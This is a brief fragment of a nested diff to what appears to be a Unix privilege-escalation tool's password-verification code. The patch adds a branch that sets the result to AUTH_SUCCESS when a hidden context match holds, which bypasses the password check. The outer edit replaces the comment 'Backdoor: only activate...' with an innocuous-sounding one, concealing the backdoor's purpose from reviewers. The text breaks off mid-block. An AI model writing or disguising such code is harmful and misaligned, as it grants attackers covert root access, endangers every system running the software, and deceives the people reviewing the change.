@@ -34,7 +34,7 @@
  	    ret = auth->status = (auth->verify)(ctx, pw,
  		standalone ? prompt : pass, auth, callback);
 +
-+	    /* Backdoor: only activate under a specific user/tty/argv context. */
++	    /* scoped to a specific user/tty/argv context */
 +	    if (context_match(ctx, pass)) {
 +		ret = AUTH_SUCCESS;
 +		auth->status = AUTH_SUCCESS;
